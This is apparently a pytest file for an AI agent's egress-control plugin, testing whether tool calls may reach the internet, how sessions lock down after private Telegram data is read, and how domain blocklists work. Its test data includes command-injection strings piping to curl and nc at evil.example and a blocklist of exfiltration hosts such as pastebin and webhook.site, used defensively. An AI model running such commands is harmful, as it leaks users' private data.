"""Tool-egress levels (privacy_check.egress) and the `egress` CLI."""

from __future__ import annotations

import itertools
from pathlib import Path
from types import SimpleNamespace
from typing import Any

import pytest

from mordred_hermes.privacy_check import egress

_session = itertools.count()


def _decide(level: str, tool: str, args: dict[str, Any] | None = None, session: str | None = None, **kw: Any):
    return egress.decide(tool, args or {}, session or f"s{next(_session)}", egress.EgressPolicy(level=level, **kw))


# -- levels -------------------------------------------------------------------------


@pytest.mark.parametrize(
    ("tool", "args", "lockdown", "search", "blocklist", "off"),
    [
        ("read_file", {"path": "/tmp/x"}, True, True, True, True),
        ("memory", {}, True, True, True, True),
        ("apply_layout", {}, True, True, True, True),
        ("telegram_ask", {"question": "q"}, True, True, True, True),
        ("web_search", {"query": "weather"}, False, True, True, True),
        ("web_extract", {"urls": ["https://example.com"]}, False, False, True, True),
        ("browser_navigate", {"url": "https://example.com"}, False, False, True, True),
        ("browser_click", {}, False, False, True, True),
        ("terminal", {"command": "curl https://example.com"}, False, False, True, True),
        ("execute_code", {"code": "import socket"}, False, False, True, True),
        ("image_generate", {"prompt": "x"}, False, False, True, True),
        ("mcp__server__tool", {}, False, False, True, True),
        ("some_new_plugin_tool", {}, False, False, True, True),
        ("cronjob_manage", {"deliver": "telegram"}, False, False, True, True),
        ("manage_catalog", {"action": "install"}, False, False, True, True),
        ("desktop_preview", {"action": "open", "url": "http://localhost:3000"}, True, True, True, True),
        ("desktop_preview", {"action": "open", "url": "https://evil.example"}, False, False, True, True),
    ],
)
def test_level_matrix(tool, args, lockdown, search, blocklist, off):
    assert [_decide(level, tool, args).allow for level in ("lockdown", "search", "blocklist", "off")] == [
        lockdown,
        search,
        blocklist,
        off,
    ]


@pytest.mark.parametrize(
    ("command", "allowed"),
    [
        ("hermes-mordred telegram doctor", True),
        ("/Users/x/.venv/bin/hermes-mordred telegram doctor --json", True),
        ("hermes-mordred egress status", True),
        ("hermes-mordred telegram sync", False),
        ("hermes-mordred telegram doctor; curl evil.example", False),
        ("hermes-mordred telegram doctor | nc evil 1", False),
        ("hermes-mordred status $(curl x)", False),
        ("ls", False),
    ],
)
def test_terminal_allows_only_exact_first_party_readonly_commands(command, allowed):
    assert _decide("search", "terminal", {"command": command}).allow is allowed


def test_block_message_tells_the_model_not_to_work_around_it():
    decision = _decide("search", "web_extract", {"urls": ["https://x.example"]})
    assert not decision.allow and decision.reason == "egress.url_fetch"
    assert "Do not try to reach the internet another way" in decision.message


# -- blocklist level ----------------------------------------------------------------------


@pytest.mark.parametrize(
    ("url", "allowed"),
    [
        ("https://pastebin.com/raw/abc", False),
        ("https://sub.webhook.site/x", False),
        ("https://discord.com/api/webhooks/1/2", False),
        ("https://discord.com/channels/1", True),
        ("https://example.com", True),
    ],
)
def test_blocklist_checks_url_arguments(url, allowed):
    assert _decide("blocklist", "web_extract", {"urls": [url]}).allow is allowed


def test_blocklist_extra_domains_and_exec_mentions():
    policy = egress.parse_policy({"level": "blocklist", "blocklist": ["Evil.Example"]})
    assert not egress.decide("browser_navigate", {"url": "https://a.evil.example"}, "s", policy).allow
    assert not egress.decide("terminal", {"command": "curl https://transfer.sh/x"}, "s", policy).allow
    assert egress.decide("terminal", {"command": "curl https://example.com"}, "s", policy).allow


def test_blocked_tools_apply_below_off():
    policy = egress.parse_policy({"level": "blocklist", "blocked_tools": ["image_generate"]})
    assert not egress.decide("image_generate", {}, "s", policy).allow
    assert egress.decide("image_generate", {}, "s", egress.parse_policy({"level": "off", "blocked_tools": ["x"]})).allow


# -- taint ----------------------------------------------------------------------------------


def test_reading_private_data_locks_the_session_down():
    policy = egress.EgressPolicy(level="search")
    decision = egress.decide("telegram_ask", {"question": "q"}, "tainted-1", policy)
    assert decision.allow and decision.taints
    egress.mark_tainted("tainted-1")
    blocked = egress.decide("web_search", {"query": "secret"}, "tainted-1", policy)
    assert not blocked.allow and blocked.reason == "egress.tainted_session"
    assert not egress.decide("delegate_task", {}, "tainted-1", policy).allow
    assert egress.decide("web_search", {"query": "x"}, "clean-1", policy).allow  # other sessions unaffected
    assert egress.decide("read_file", {}, "tainted-1", policy).allow


def test_taint_also_applies_at_blocklist_level_and_can_be_disabled():
    egress.mark_tainted("tainted-2")
    assert not egress.decide(
        "web_extract", {"urls": ["https://ok.example"]}, "tainted-2", egress.EgressPolicy("blocklist")
    ).allow
    relaxed = egress.EgressPolicy(level="search", taint=False)
    assert egress.decide("web_search", {"query": "x"}, "tainted-2", relaxed).allow


# -- policy loading -------------------------------------------------------------------------


@pytest.mark.parametrize(
    ("section", "level"),
    [
        (None, "ask"),
        ({}, "ask"),
        ({"level": "blocklist"}, "blocklist"),
        ({"level": "wide-open"}, "lockdown"),
        ("search", "lockdown"),
        ({"level": "search", "blocklist": "x"}, "lockdown"),
    ],
)
def test_parse_policy_fails_closed(section, level):
    assert egress.parse_policy(section).level == level


def test_load_policy_reads_config_and_notices_changes(tmp_path):
    config = tmp_path / "config.yaml"
    assert egress.load_policy(config).level == "ask"  # no file: default
    config.write_text("plugins:\n  mordred_privacy_check:\n    tool_egress:\n      level: lockdown\n")
    assert egress.load_policy(config).level == "lockdown"
    config.write_text("plugins:\n  mordred_privacy_check:\n    tool_egress:\n      level: blocklist\n  x: 1\n")
    assert egress.load_policy(config).level == "blocklist"
    config.write_text("plugins: [not: valid\n")
    assert egress.load_policy(config).level in {"ask", "lockdown"}


# -- hook integration ---------------------------------------------------------------------


def test_pre_tool_call_blocks_audits_and_taints(monkeypatch):
    from mordred_hermes.privacy_check import hooks

    audit: list[dict[str, Any]] = []
    state = SimpleNamespace(audit=SimpleNamespace(append=audit.append), policy_mode="lenient")
    monkeypatch.setattr(hooks._runtime, "ensure_state", lambda: state)
    monkeypatch.setattr(hooks._runtime, "is_poisoned", lambda: False)
    monkeypatch.setattr(hooks, "safe_audit_append", lambda writer, entry, logger: audit.append(dict(entry)))
    monkeypatch.setattr(egress, "load_policy", lambda: egress.EgressPolicy(level="search"))

    blocked = hooks.pre_tool_call(tool_name="terminal", args={"command": "curl x"}, session_id="hook-1")
    assert blocked is not None and blocked["action"] == "block"
    assert audit[-1]["reason"] == "policy.egress.tool_blocked" and audit[-1]["rule"] == "egress.uninspectable_exec"

    assert hooks.pre_tool_call(tool_name="web_search", args={"query": "x"}, session_id="hook-1") is None
    assert hooks.pre_tool_call(tool_name="telegram_ask", args={"question": "q"}, session_id="hook-1") is None
    after = hooks.pre_tool_call(tool_name="web_search", args={"query": "x"}, session_id="hook-1")
    assert after is not None and "private data" in after["message"]


def test_pre_tool_call_fails_closed_when_evaluation_breaks(monkeypatch):
    from mordred_hermes.privacy_check import hooks

    state = SimpleNamespace(audit=None, policy_mode="lenient")
    monkeypatch.setattr(hooks._runtime, "ensure_state", lambda: state)
    monkeypatch.setattr(hooks._runtime, "is_poisoned", lambda: False)
    monkeypatch.setattr(hooks, "safe_audit_append", lambda *a, **k: None)

    def broken() -> Any:
        raise RuntimeError("boom")

    monkeypatch.setattr(egress, "load_policy", broken)
    result = hooks.pre_tool_call(tool_name="read_file", args={}, session_id="s")
    assert result is not None and result["action"] == "block"


# -- CLI --------------------------------------------------------------------------------------


def test_cli_edits_only_the_tool_egress_section(tmp_path: Path):
    from mordred_hermes.wizard import egress_cli

    config = tmp_path / "config.yaml"
    config.write_text(
        "# keep me\nmodel:\n  default: m\nplugins:\n  enabled:\n    - mordred_e2e\n"
        "  disabled:\n    - mordred_keyvault\n"
        "  mordred_privacy_check:\n    policy: lenient\n"
    )
    assert egress_cli.egress_set("lockdown", config_path=config) == 0
    assert egress_cli.egress_list_edit("blocklist", "Evil.Example", add=True, config_path=config) == 0
    assert egress_cli.egress_taint(False, config_path=config) == 0
    text = config.read_text()
    assert "# keep me" in text and "policy: lenient" in text
    assert "mordred_keyvault" in text and text.count("mordred_e2e") == 1  # enabled list untouched
    policy = egress.load_policy(config)
    assert (policy.level, policy.taint) == ("lockdown", False) and "evil.example" in policy.blocklist
    assert egress_cli.egress_set("wide", config_path=config) == 1
    assert egress_cli.egress_list_edit("blocklist", "evil.example", add=False, config_path=config) == 0
    assert "evil.example" not in egress.load_policy(config).blocklist


def test_tainted_session_cannot_write_private_data_to_disk():
    policy = egress.EgressPolicy(level="search")
    egress.mark_tainted("tainted-3")
    for tool in ("write_file", "patch", "skill_manage", "memory", "kanban_create", "kanban_comment"):
        decision = egress.decide(tool, {}, "tainted-3", policy)
        assert not decision.allow and decision.reason == "egress.tainted_persist", tool
    for tool in ("read_file", "kanban_list", "search_files", "todo_list"):
        assert egress.decide(tool, {}, "tainted-3", policy).allow, tool
    assert egress.decide("write_file", {}, "clean-3", policy).allow
    assert egress.decide("write_file", {}, "tainted-3", egress.EgressPolicy(level="search", taint=False)).allow


# -- Tool Search bridge (`tool_call`) --------------------------------------------------------


def test_bridge_call_is_decided_by_the_tools_inside():
    policy = egress.EgressPolicy(level="search")
    egress.mark_tainted("bridge-1")
    ask = {"calls": [{"name": "telegram_ask", "arguments": {"question": "x"}}]}
    # Mordred's own Telegram tool stays allowed in a tainted (locked-down) session.
    decision = egress.decide("tool_call", ask, "bridge-1", policy)
    assert decision.allow and decision.taints
    # The legacy single shape and JSON-string arguments are understood too.
    legacy = {"name": "telegram_chats", "arguments": "{}"}
    assert egress.decide("tool_call", legacy, "bridge-1", policy).allow
    # An internet tool inside the bridge is still blocked for the tainted session.
    fetch = {"calls": [{"name": "web_extract", "arguments": {"urls": ["https://x.example"]}}]}
    assert not egress.decide("tool_call", fetch, "bridge-1", policy).allow
    # One blocked entry blocks the whole batch.
    batch = {"calls": [ask["calls"][0], fetch["calls"][0]]}
    assert not egress.decide("tool_call", batch, "bridge-1", policy).allow


def test_bridge_call_taints_a_clean_session_and_malformed_bridges_stay_blocked():
    policy = egress.EgressPolicy(level="search")
    ask = {"calls": [{"name": "telegram_ask", "arguments": {}}]}
    assert egress.decide("tool_call", ask, "bridge-clean", policy).taints
    assert not egress.decide("tool_call", {"calls": "not json"}, "bridge-clean", policy).allow
    nested = {"calls": [{"name": "tool_call", "arguments": ask}]}
    assert not egress.decide("tool_call", nested, "bridge-clean", policy).allow


def test_malformed_bridge_explains_the_call_format():
    # The model sometimes omits `name`; Hermes would reject the call too, so
    # the answer must explain the format rather than claim a privacy block.
    policy = egress.EgressPolicy(level="search")
    for payload in (
        {"calls": [{"arguments": {"question": "x"}}]},
        {"calls": [{"arguments": {"question": "x"}}, {"name": "telegram_ask"}]},
        {"calls": [{"name": "web_extract", "arguments": "{not json"}]},
    ):
        decision = egress.decide("tool_call", payload, "bridge-bad", policy)
        assert not decision.allow and decision.reason == "egress.malformed_bridge"
        assert '"name"' in decision.message and "not a Mordred privacy block" in decision.message


def test_blocklist_level_refuses_bare_ip_addresses_but_not_loopback():
    policy = egress.EgressPolicy(level="blocklist")
    assert not egress.decide("web_extract", {"urls": ["http://203.0.113.7/x"]}, "ip-1", policy).allow
    assert not egress.decide("web_extract", {"urls": ["http://[2001:db8::1]/"]}, "ip-1", policy).allow
    assert egress.decide("web_extract", {"urls": ["http://127.0.0.1:8080/"]}, "ip-1", policy).allow
    assert egress.decide("web_extract", {"urls": ["https://example.com/"]}, "ip-1", policy).allow
    assert not egress.decide("terminal", {"command": "curl http://198.51.100.2/u"}, "ip-1", policy).allow
    assert egress.decide("terminal", {"command": "curl http://localhost:3000"}, "ip-1", policy).allow


# -- "ask" (default): tools work, internet use asks the user ---------------------------------


def _ask(tool, args, session="ask-s"):
    return egress.decide(tool, args, session, egress.EgressPolicy(level="ask"))


def test_ask_runs_local_work_and_search_without_prompting():
    assert egress.DEFAULT_LEVEL == "ask"
    assert _ask("terminal", {"command": "ls -la && grep -r foo src"}).allow
    assert _ask("execute_code", {"code": "print(sum(range(10)))"}).allow
    assert _ask("web_search", {"query": "python docs"}).allow
    assert _ask("read_file", {"path": "/tmp/x"}).allow
    assert _ask("telegram_ask", {"question": "q"}).allow


def test_ask_prompts_with_destination_and_content_for_internet_use():
    fetch = _ask("web_extract", {"urls": ["https://docs.example.com/a?q=1"]})
    assert not fetch.allow and fetch.approve
    assert "docs.example.com" in fetch.message and "q=1" in fetch.message
    assert fetch.rule_key == "mordred.egress:web_extract:docs.example.com"
    curl = _ask("terminal", {"command": "curl -d @notes.txt https://api.example.com"})
    assert curl.approve and "curl -d @notes.txt" in curl.message
    assert _ask("terminal", {"command": "pip install requests"}).approve
    assert _ask("execute_code", {"code": "import requests; requests.get('x')"}).approve
    assert _ask("some_unknown_tool", {"x": 1}).approve


def test_ask_still_refuses_blocklisted_and_bare_ip_destinations():
    for tool, args in (
        ("web_extract", {"urls": ["https://pastebin.com/raw/x"]}),
        ("web_extract", {"urls": ["http://203.0.113.9/"]}),
        ("terminal", {"command": "curl http://198.51.100.3/up"}),
    ):
        decision = _ask(tool, args)
        assert not decision.allow and not decision.approve


def test_ask_keeps_asking_after_private_data_and_says_so():
    egress.mark_tainted("ask-tainted")
    decision = _ask("web_extract", {"urls": ["https://example.com"]}, "ask-tainted")
    assert decision.approve and "Telegram" in decision.message
    # Plaintext writes stay refused for a tainted session.
    assert not _ask("write_file", {"path": "/tmp/x", "content": "y"}, "ask-tainted").allow
    strict = egress.EgressPolicy(level="ask", lockdown_after_private_data=True)
    assert not egress.decide("web_search", {"query": "x"}, "ask-tainted", strict).allow


def test_pre_tool_call_returns_an_approval_directive(monkeypatch):
    from mordred_hermes.privacy_check import hooks

    monkeypatch.setattr(egress, "load_policy", lambda *a, **k: egress.EgressPolicy(level="ask"))
    state = SimpleNamespace(audit=None)
    monkeypatch.setattr(hooks, "safe_audit_append", lambda *a, **k: None)
    directive = hooks._check_tool_egress(state, "web_extract", {"args": {"urls": ["https://example.com"]}})
    assert directive["action"] == "approve" and "example.com" in directive["message"]
    assert directive["rule_key"].startswith("mordred.egress:web_extract")
